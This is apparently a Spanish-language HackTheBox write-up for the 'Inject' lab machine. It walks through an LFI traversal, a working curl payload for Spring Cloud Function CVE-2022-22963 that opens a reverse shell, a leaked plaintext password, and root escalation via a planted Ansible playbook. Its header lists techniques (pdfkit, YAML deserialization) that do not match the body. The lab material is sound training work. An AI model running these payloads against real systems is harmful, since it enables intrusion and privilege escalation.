---
title: HackTheBox - Inject
author: cotes
date: 2023-09-20 17:51:00 +0800
categories: [Writeup, HackTheBox, Easy]
tags: [Linux, 'LFI', 'RCE Spring Boot (CVE-2022-22963)', 'Information Leakage', 'Ansible Playbook']
math: true
mermaid: true
image:
  path: /assets/images/HTB/Easy/Inject/logo.jpeg
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
  alt: Inject Machine Logo
---

Máquina Linux de nivel **Easy** de HackTheBox.

Técnicas usadas: **RCE pdfkit 0.8.6 (CVE-2022-25765), Information Leakage, Leak Information, YAML Deserialization**

### Fase de Reconocimiento 🧣

a. Enumeramos los puertos que están abiertos.

* **`nmap -p- -sS -Pn -n <IP> -oG puertos`**

    ![](/assets/images/HTB/Easy/Inject/01-ports.png)

b. Vemos las versiones de los servicios que se están ejecutando en los puertos abiertos

* **`nmap -p<Puertos> -sCV <IP> -oN versiones`**

    ![](/assets/images/HTB/Easy/Inject/02-versions.png)

c. Al visitar la página web tendremos un apartado de `/upload` que nos permitirá subir una imagen

![](/assets/images/HTB/Easy/Inject/03-upload.png)

* Al capturar la petición con Burp Suite nos fijamos que carga la imagen mediante un parámetro

    ![](/assets/images/HTB/Easy/Inject/04-burp.png)

* La web es vulnerable a un LFI con el patrón: `..///////..////..//////etc/passwd` [HackTricks - LFI](https://book.hacktricks.xyz/pentesting-web/file-inclusion)

> Nos mencionan en HackTricks que si al indicarle un directorio, a través del LFI, nos lista los archivos que existen, es una aplicación creada con Java.
{: .prompt-info }

![](/assets/images/HTB/Easy/Inject/05-list.png)

d. Con lo anterior en mente buscamos ficheros que contengan información relevante.

![](/assets/images/HTB/Easy/Inject/06-pom.png)

* Esta versión de **SpringBoot** es vulnerable a un RCE [CVE-2022-22963](https://github.com/J0ey17/CVE-2022-22963_Reverse-Shell-Exploit/blob/main/exploit.py)

    ![](/assets/images/HTB/Easy/Inject/07-curl.png)

* Nos entablaremos una reverse shell

    ```bash
    ❯ curl -s -X POST http://10.10.11.204:8080/functionRouter -H "spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(\"bash -c {echo,'[Payload Base64]'}|{base64,-d}|{bash,-i}\")" -H "Accept-Encoding: gzip, deflate" -H "Accept: */*" -H "Accept-Language: en" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36" -H "Content-Type: application/x-www-form-urlencoded"
    -------------------------------------------------------------------------
    ❯ nc -lvnp 443
    frank@inject:/$ 
    ```

### Escalada de Privilegios 💹

a. En nuestro directorio encontraremos un directorio **.m2** el cual contiene un fichero con las credenciales del usuario phil

```xml
<username>phil</username>
<password>DocPhillovestoInject123</password>
```

b. Subimos el [pspy64](https://github.com/DominicBreuker/pspy/releases/tag/v1.2.1)

```bash
phil@inject:/tmp$ ./pspy64

<SNIP>
2023/09/21 16:56:01 CMD: UID=0     PID=5214   | /bin/sh -c /usr/local/bin/ansible-parallel /opt/automation/tasks/*.yml
```

> La tarea es del usuario **root**. Lo que hace es ejecutar todos los ficheros *.yml en el directorio /opt/automation/tasks/
{: .prompt-info }

* Al investigar por alguna forma de escalar privilegios, encontramos este [post](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/ansible-playbook-privilege-escalation/)

* Creamos un fichero .yml en el que el comando a ejecutar será `chmod +s /bin/bash`

    ```bash
    phil@inject:/opt/automation/tasks$ ls -la /bin/bash
    -rwxr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
    phil@inject:/opt/automation/tasks$ cat book.yml 
    - hosts: localhost
    tasks:
        - name: RShell
        command: chmod +s /bin/bash

    phil@inject:/opt/automation/tasks$ ls -la /bin/bash
    -rwsr-sr-x 1 root root 1183448 Apr 18  2022 /bin/bash
    phil@inject:/opt/automation/tasks$ bash -p
    bash-5.0# whoami
    root
    ```